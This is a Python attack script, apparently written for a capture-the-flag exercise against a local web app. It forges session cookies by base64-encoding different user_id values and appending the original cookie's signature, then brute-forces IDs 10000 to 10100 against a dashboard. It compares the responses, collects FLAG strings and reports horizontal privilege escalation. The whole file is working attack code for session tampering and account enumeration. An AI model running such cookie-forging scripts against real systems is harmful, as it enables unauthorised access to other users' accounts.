import requests, json, base64, time, socket

# Configure socket for stability
socket.setdefaulttimeout(30)

# Target details
url = "http://127.0.0.1:33187/dashboard"
original_cookie = "eyJ1c2VyX2lkIjoiMTAwMzIifQ.aVd0oA.VqPUgS4MLdLZbrF9JRNetU8FfwI"
timestamp_sig = ".aVd0oA.VqPUgS4MLdLZbrF9JRNetU8FfwI"

print("Session Cookie Brute Force - Testing user_id values 10000-10100")
print("="*60)
print(f"Target URL: {url}")
print(f"Cookie structure: [base64_payload]{timestamp_sig}")
print()

# Create persistent session with connection pooling
session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
})

# Disable keep-alive
session.keep_alive = False

# Get baseline
print("[*] Getting baseline response for original user_id (10032)...")
try:
    resp = session.get(url, cookies={'session': original_cookie}, timeout=30, verify=False)
    baseline_status = resp.status_code
    baseline_size = len(resp.text)
    print(f"    Status: {baseline_status} | Response size: {baseline_size} bytes")
    print(f"    Baseline established successfully\n")
    time.sleep(2)
except Exception as e:
    print(f"[!] Baseline failed: {e}")
    baseline_status = 0
    baseline_size = 0

# Test with delays
results = []
flags = []
errors = 0
success_count = 0

print("[*] Testing user ID range 10000-10100 (with 1s delays)...")
print("-"*60)

for uid in range(10000, 10101):
    try:
        # Build payload
        payload = json.dumps({"user_id": str(uid)}, separators=(',', ':'))
        encoded = base64.b64encode(payload.encode()).decode().rstrip('=')
        cookie = encoded + timestamp_sig
        
        # Test
        resp = session.get(url, cookies={'session': cookie}, timeout=30, verify=False)
        size = len(resp.text)
        status = resp.status_code
        
        # Check for flags
        import re
        flag_matches = re.findall(r'FLAG\{[^}]+\}', resp.text)
        
        # Store different responses
        if size != baseline_size or flag_matches or status != baseline_status:
            results.append({
                'uid': uid,
                'status': status,
                'size': size,
                'flags': flag_matches,
                'preview': resp.text[:150]
            })
            
            if flag_matches:
                flags.extend(flag_matches)
                for flag in flag_matches:
                    print(f"[!] FLAG FOUND at user_id={uid}")
                    print(f"    Flag: {flag}")
            
            if status == 200 or size > baseline_size:
                print(f"[+] Valid access: user_id={uid} (Status: {status}, Size: {size}B)")
                success_count += 1
        
        # Progress
        if uid % 20 == 0:
            print(f"  Progress: {uid - 10000}/101 tested...")
        
        # Significant delay
        time.sleep(1)
        
    except Exception as e:
        errors += 1
        if errors <= 3:
            print(f"[!] Error at UID {uid}: {str(e)}")
        time.sleep(3)  # Extra wait on error

# Final summary
print("\n" + "="*60)
print("BRUTE FORCE COMPLETE")
print("="*60)
print(f"Total successful accesses: {success_count}")
print(f"Total different responses: {len(results)}")
print(f"Total errors: {errors}")

if success_count > 0:
    print(f"\n[!] ACCESSIBLE ACCOUNTS FOUND:")
    for r in results:
        if r['status'] == 200 or r['size'] > 100:
            print(f"    user_id={r['uid']} (Status: {r['status']}, Size: {r['size']}B)")
            if r['preview']:
                print(f"    Preview: {r['preview'][:80]}...")

if flags:
    print(f"\n[!] FLAGS FOUND ({len(flags)} total):")
    for flag in flags:
        print(f"  {flag}")
else:
    print("\n[*] No flags found in responses")

# Show vulnerability confirmation
if success_count > 1:
    print(f"\n[!] VULNERABILITY CONFIRMED:")
    print("     Session cookie manipulation allows access to other user accounts")
    print("     Horizontal privilege escalation possible")
